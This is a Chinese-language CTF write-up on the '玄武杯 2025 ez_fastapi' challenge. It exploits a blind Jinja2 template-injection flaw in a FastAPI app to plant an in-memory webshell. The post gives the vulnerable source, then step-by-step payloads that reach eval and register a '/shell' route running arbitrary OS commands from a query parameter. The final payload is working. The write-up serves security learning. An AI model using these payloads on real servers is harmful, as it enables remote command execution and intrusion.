---
title: Flask的安全研究
description: 记一次手写内存马的操作
author: lamaper
date: 2025-11-13 10:32:21 +0800
categories: [Cyber Security]
tags: [ctf, web, python, fastapi, jinja2, SSTI, Trojan]
math: true
mermaid: true
toc: true
render_with_liquid: true
image:
  path: https://ts2.tc.mm.bing.net/th/id/OIP-C.90pKwwwqN1PqpEIN3Hj1-gHaCq?cb=ucfimgc2&rs=1&pid=ImgDetMain&o=7&rm=3
---

# FastAPI与Jinja2结合的内存马

题目来源：[玄武杯 2025] ez_fastapi

观察题目源代码：

```python 
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from jinja2 import Environment
import uvicorn, sys

app = FastAPI()
Jinja2 = Environment()

Jinja2 = Environment(
    variable_start_string='{',
    variable_end_string='}'
)

@app.exception_handler(404)
async def handler_404(request, exc):
    print('not found!')
    return JSONResponse(
        status_code=404,
        content={"message": "Not found"}
    )

@app.middleware('http')
async def say_hello(request: Request, call_next):
    response = await call_next(request)
    response.headers['say1'] = 'hello!'
    return response

@app.middleware('http')
async def say_hi(request: Request, call_next):
    response = await call_next(request)
    response.headers['say2'] = 'hi!'
    return response

@app.get("/")
async def index():
    return {"message": "Hello World"}

@app.get("/shellMe")
async def shellMe(username="Guest"):
    Jinja2.from_string("Welcome " + username).render()
    # print(Jinja2.from_string("Welcome " + username).render()) 这段是我自己加的，为了方便调试
    return HTMLResponse(content="<h1>Welcome!</h1><p>Request processed.</p>")

def method_disabled(*args, **kwargs):
    raise NotImplementedError("此路不通！该方法已被管理员禁用。")

app.add_api_route = method_disabled
app.add_middleware = method_disabled

if __name__ == "__main__":
    uvicorn.run(app, host='0.0.0.0', port=8000)
```

显然是一个Jinja2的SSTI题目，但是题目无回显，尝试反弹Shell也没成功~~（也许是姿势不对？）~~，遂尝试打入内存马。

通常来说，内存马一般都需要注册一个路由然后获取参数以执行。以一个十分简单的内存马为原型：

```
lipsum.__globals__['__builtins__']['eval']("sys.modules['__main__'].__dict__['app'].router.add_api_route('/shell',lambda cmd='whoami':__import__('os').popen(cmd).read(),methods=['GET'])")
```

这个内存马原理很简单，通过`lipsum`这个Jinja2全局函数获取它的`__globals__`属性以得到`eval`，然后获取`app`来进行其他操作。

需要注意的是，这里的`app`**原理上**来自于

```python
app = FastAPI()
```

为什么说是原理上呢，因为本题目依赖`uvicorn`。本题目的启动脚本是：

```bash
uvicorn app:app --host 0.0.0.0 --port 8000
```

在这种运行方式下：

- 第一个`app` 是模块名（`app.py`）
- 第二个`app` 是模块中的变量（FastAPI 实例）
- uvicorn **不会把 app 放在 `__main__`**
- `__main__` 是 uvicorn 的启动脚本，不是我们的模块

所以显而易见地，上面那个理论内存马行不通。我们应该先获取所有的module，本地运行这个脚本，修改一下源代码使其能在控制台看到回显：

```
lipsum.__globals__['__builtins__']['eval']('sys.modules')
```

在后台返回：

```
Welcome {'sys': <module 'sys' (built-in)>, 'builtins': <module 'builtins' (built-in)>, 
...
, 'os': <module 'os' (frozen)>,
...
'app': <module 'app' from '/mnt/e/ctfTools/CtfLab/PyTrojan/app.py'>, 
...
```

显然这里的`app`就是我们想要的。

我们接着构造：

```
lipsum.__globals__['__builtins__']['eval']('sys.modules['app'].__dict__')
```

可以看到回显：

```
Welcome {'__name__': 'app', '__doc__': None, '__package__': '', 
...
'FastAPI': <class 'fastapi.applications.FastAPI'>, 
'Request': <class 'starlette.requests.Request'>, 
'HTMLResponse': <class 'starlette.responses.HTMLResponse'>,
'JSONResponse': <class 'starlette.responses.JSONResponse'>,
'Environment': <class 'jinja2.environment.Environment'>, 
'uvicorn': <module 'uvicorn' from '/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/uvicorn/__init__.py'>, 
'sys': <module 'sys' (built-in)>, 
'app': <fastapi.applications.FastAPI object at 0x7f167f15a510>, 
'Jinja2': <jinja2.environment.Environment object at 0x7f167ef678c0>, 
'handler_404': <function handler_404 at 0x7f167ef82de0>, 
'say_hello': <function say_hello at 0x7f167ef82e80>, 
'say_hi': <function say_hi at 0x7f167ef82f20>, 
'index': <function index at 0x7f167ef82fc0>, 
'shellMe': <function shellMe at 0x7f167ef83240>, 
'method_disabled': <function method_disabled at 0x7f167ef82d40>}
```

这里我们看到，整个`app.py`的对象都被暴露，我们要做得是获取`'app': <fastapi.applications.FastAPI object at 0x7f167f15a510>`，接下来的思路就很流畅了，理论上内存马的payload可以是：

```
lipsum.__globals__['__builtins__']['eval']("sys.modules['app'].app.router.add_api_route('/shell',lambda cmd='whoami':__import__('os').popen(cmd).read(),methods=['GET'])")
```

但是问题还没有解决，对于本题来说，由于题目禁止了`add_api_route`这个方法：

```python 
def method_disabled(*args, **kwargs):
    raise NotImplementedError("此路不通！该方法已被管理员禁用。")

app.add_api_route = method_disabled
app.add_middleware = method_disabled
```

我们应该选择别的函数进行路由注册。

查看fastapi的源代码，在./fastapi/applications.py中看到了：

```python
class FastAPI(Starlette):
    """
    `FastAPI` app class, the main entrypoint to use FastAPI.

    Read more in the
    [FastAPI docs for First Steps](https://fastapi.tiangolo.com/tutorial/first-steps/).

    ## Example

    ```python
    from fastapi import FastAPI

    app = FastAPI()
    ```
    """
```

在上下文查找，可以看到除了`add_api_route`以外还有` add_api_websocket_route`，由于我的计算机网络知识不牢靠，我并不敢使用这个方法（~~懒得查~~），所以只能继续找。很可惜，没有别的添加路由的方法了。但是令人惊喜的是，FastAPI的父类Starlettey有一个方法`add_route`，在./starlette/applications.py中：

```python
    def add_route(
        self,
        path: str,
        route: Callable[[Request], Awaitable[Response] | Response],
        methods: list[str] | None = None,
        name: str | None = None,
        include_in_schema: bool = True,
    ) -> None:  # pragma: no cover
        self.router.add_route(path, route, methods=methods, name=name, include_in_schema=include_in_schema)
```

接下来我们需要利用这个方法来构造内存马。

所以当我们兴高采烈地构造：

```
lipsum.__globals__['__builtins__']['eval']
("sys.modules['app'].app.router.add_route(
    '/shell',lambda cmd='whoami':__import__('os').popen(cmd).read(),methods=['GET']
    )
")
```

然后就会很意外地报错：

```
...
File "E:\ProgramFile\Python\Python312\Lib\site-packages\anyio\_backends\_asyncio.py", line 2461, in run_sync_in_worker_thread return await future ^^^^^^^^^^^^ File "E:\ProgramFile\Python\Python312\Lib\site-packages\anyio\_backends\_asyncio.py", line 962, in run result = context.run(func, *args) ^^^^^^^^^^^^^^^^^^^^^^^^ File "<string>", line 1, in <lambda> File "<frozen os>", line 1015, in popen TypeError: invalid cmd type (<class 'starlette.requests.Request'>, expected string)
```

这个报错其实跟 `add_route` 本身没关系，而是我们的 lambda 收到的是 `Request` 对象，却直接丢给了 `os.popen`。具体来说：

**`add_api_route`：** endpoint 可以是 FastAPI 风格

**`add_route`：** endpoint 必须是 Starlette 风格，**第一个参数就是 `Request` 对象**

所以现在我们的任务是解析Request对象以获取我们想要的字符串，重新构造payload：

```
lipsum.__globals__['__builtins__']['eval']
("sys.modules['app'].app.router.add_route(
    '/shell',lambda request: __import__('os').popen(request.query_params.get('cmd', 'whoami').read()),methods=['GET']
    )
")
```

然后又发生报错：

```
File "starlette/routing.py", line 76, in app
    await response(scope, receive, send)
TypeError: 'str' object is not callable
```

这里来看， `add_route` 注册的这个 endpoint 返回的是一个纯字符串，但 Starlette 期望它返回的是一个 “可调用的 ASGI app” 或 Response 对象，于是拿这个字符串当协程去调用，就直接炸了。所以继续修改payload：

```
lipsum.__globals__['__builtins__']['eval']
("sys.modules['app'].app.router.add_route(
    '/shell',lambda request: PlainTextResponse(
        __import__('os').popen(request.query_params.get('cmd', 'whoami')
        ).read()
    ),methods=['GET']
    )
")
```

这里用`PlainTextResponse()`来显式返回一个 Response 对象，执行之后又又又又又又又报错了：

```
File "E:\ProgramFile\Python\Python312\Lib\site-packages\anyio\_backends\_asyncio.py", line 962, in run result = context.run(func, *args) ^^^^^^^^^^^^^^^^^^^^^^^^ File "<string>", line 1, in <lambda> NameError: name 'PlainTextResponse' is not defined
```

这里很显然是因为`app.py`没有import这个库，我们引入一下即可。所以最终的payload为：

```
lipsum.__globals__['__builtins__']['eval']
("sys.modules['app'].app.router.add_route(
    '/shell',
    lambda request: __import__('starlette.responses', fromlist=['PlainTextResponse']).PlainTextResponse(__import__('os').popen(request.query_params.get('cmd', 'whoami')).read()),methods=['GET']
    )
")
```

本地测试一下：

![image-20251113102328611](/assets/img/post/fastapi-trojan/image-20251113102328611.png)

没有任何问题，在题目环境测试一下：

![image-20251113102556117](/assets/img/post/fastapi-trojan/image-20251113102556117.png)

依旧没有任何问题。

这样就完美地解决了这个题目。

PS：NSS上这个题环境应该还没搞好，读/flag显示为空，environ的flag也不对：

![image-20251113102933368](/assets/img/post/fastapi-trojan/image-20251113102933368.png)







其实我还是想试一试websocket，留到下次研究吧（）